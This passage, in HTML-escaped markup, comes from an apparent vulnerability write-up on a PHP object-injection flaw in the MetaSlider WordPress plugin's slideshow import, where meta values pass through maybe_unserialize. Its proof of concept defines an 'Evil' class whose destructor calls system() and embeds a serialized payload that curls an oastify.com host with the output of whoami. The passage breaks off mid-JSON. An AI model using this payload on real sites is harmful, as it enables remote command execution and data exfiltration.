class=&#34;s1&#34;&gt;&amp;#39;ml-slider&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;slideshows&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slideshows&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_error_message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;import_slideshows()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Permission check&lt;/strong&gt; â€“ if &lt;code&gt;can_access()&lt;/code&gt; returns false â†’ block via &lt;code&gt;deny_access()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extract input data&lt;/strong&gt; â€“ get the &lt;code&gt;slideshows&lt;/code&gt; field; if empty â†’ return â€œNothing to importâ€.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;JSON decode and import&lt;/strong&gt; â€“ decode &lt;code&gt;slideshows&lt;/code&gt; and call &lt;code&gt;$this-&amp;gt;slideshows-&amp;gt;import()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Error handling&lt;/strong&gt; â€“ if &lt;code&gt;WP_Error&lt;/code&gt; returned â†’ send JSON error.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Success&lt;/strong&gt; â€“ if no error â†’ send JSON success with import result.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;According to &lt;code&gt;import()&lt;/code&gt;, &lt;code&gt;$slideshows&lt;/code&gt; is the exported data from &lt;strong&gt;created slideshows&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;/**&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Will import slideshows&#xA;*&lt;/li&gt;&#xA;&lt;li&gt;@param array $slideshows - The data generated by the export method&#xA;*&lt;/li&gt;&#xA;&lt;li&gt;@throws Exception - handled within method.&lt;/li&gt;&#xA;&lt;li&gt;@return WP_Error|array - True on success, WP_Error on failure&#xA;*/&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshows&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$index&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slides&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$slide&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slide&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;restore_image_urls_from_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$new_slide_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;import()&lt;/code&gt; function loops through each slideshow, then each slide, then each meta. Each meta value is restored using &lt;code&gt;$this-&amp;gt;restore_image_urls_from_string($value)&lt;/code&gt; and stored with &lt;code&gt;add_post_meta($new_slide_id,&amp;ensp;$key,&amp;ensp;maybe_unserialize($value))&lt;/code&gt;. In other words, the code imports the entire slideshow, slides, and meta while processing image URLs and unserializing data before saving to the database.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Editor&amp;ensp;sends&amp;ensp;POST&amp;ensp;request&amp;ensp;â†’&amp;ensp;/metaslider/v1/slideshow/import&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;import_slideshows()&amp;ensp;invoked&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C{&#34;can_access():&amp;ensp;verify&amp;ensp;nonce&amp;ensp;+&amp;ensp;&#39;edit_others_posts&#39;&amp;ensp;capability&#34;}&#xD;&#xA;C&amp;ensp;--&amp;ensp;Fail&amp;ensp;--&gt;&amp;ensp;Z[&#34;deny_access()&#34;]&#xD;&#xA;C&amp;ensp;--&amp;ensp;Pass&amp;ensp;--&gt;&amp;ensp;D[&#34;Extract&amp;ensp;&#39;slideshows&#39;&amp;ensp;from&amp;ensp;request&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;json_decode(slideshows)&amp;ensp;â†’&amp;ensp;array&amp;ensp;of&amp;ensp;slideshow&amp;ensp;data&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;slideshows-&gt;import()&amp;ensp;begins&#34;]&#xD;&#xA;&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;foreach&amp;ensp;($slideshows&amp;ensp;as&amp;ensp;$slideshow)&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;foreach&amp;ensp;($slideshow[&#39;slides&#39;]&amp;ensp;as&amp;ensp;$slide)&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;foreach&amp;ensp;($slide[&#39;meta&#39;]&amp;ensp;as&amp;ensp;key&amp;ensp;=&gt;&amp;ensp;value)&#34;]&#xD;&#xA;&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J[&#34;value&amp;ensp;=&amp;ensp;restore_image_urls_from_string(value)&#34;]&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;K{&#34;Is&amp;ensp;value&amp;ensp;serialized?&#34;}&#xD;&#xA;&#xD;&#xA;K&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;L[&#34;maybe_unserialize(value)&#34;]&#xD;&#xA;K&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;M[&#34;Store&amp;ensp;meta&amp;ensp;normally&#34;]&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;N{&#34;Does&amp;ensp;unserialize&amp;ensp;create&amp;ensp;an&amp;ensp;object?&#34;}&#xD;&#xA;N&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;R[&#34;Object&amp;ensp;Injection&amp;ensp;â†’&amp;ensp;POP&amp;ensp;chain&amp;ensp;execution&#34;]&#xD;&#xA;N&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;M&#xD;&#xA;&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;O[&#34;add_post_meta(new_slide_id,&amp;ensp;key,&amp;ensp;value)&#34;]&#xD;&#xA;O&amp;ensp;--&gt;&amp;ensp;P[&#34;Import&amp;ensp;continues&amp;ensp;for&amp;ensp;remaining&amp;ensp;slideshows&#34;]&#xD;&#xA;&#xD;&#xA;R&amp;ensp;--&gt;&amp;ensp;Q[&#34;Exploit&amp;ensp;achieved&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Create any slideshow, export to get a sample JSON file.&lt;/li&gt;&#xA;&lt;li&gt;Modify the JSON file so that the &lt;code&gt;ml-slider_type&lt;/code&gt; field (or any iterated field) contains a serialized string.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;0&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;meta&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;metaslider_slideshow_theme&#34;: &#34;a:6:{s:6:\&#34;folder\&#34;;s:12:\&#34;default-base\&#34;;s:5:\&#34;title\&#34;;s:4:\&#34;Base\&#34;;s:4:\&#34;type\&#34;;s:4:\&#34;free\&#34;;s:8:\&#34;supports\&#34;;a:1:{i:0;s:4:\&#34;flex\&#34;;}s:4:\&#34;tags\&#34;;a:0:{}s:11:\&#34;description\&#34;;s:37:\&#34;This is the default MetaSlider theme.\&#34;;}&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_settings&#34;: &#34;...&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;original_id&#34;: 260,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;slides&#34;: [&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;{&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;image&#34;: &#34;erol-ahmed-305920-unsplash-1&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;image_alt&#34;: &#34;erol-ahmed-305920-unsplash-1&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;meta&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;_wp_attachment_image_alt&#34;: &#34;&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_caption_source&#34;: &#34;image-caption&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_crop_position&#34;: &#34;center-center&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_inherit_image_alt&#34;: &#34;1&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_inherit_image_title&#34;: &#34;1&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;ml-slider_type&#34;: &#34;O:4:\&#34;Evil\&#34;:1:{s:7:\&#34;command\&#34;;s:74:\&#34;curl http://9blonkz57zyrp69hwuz5tw0uoluci26r.oastify.com?leadked=$(whoami)\&#34;;}&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;order&#34;: 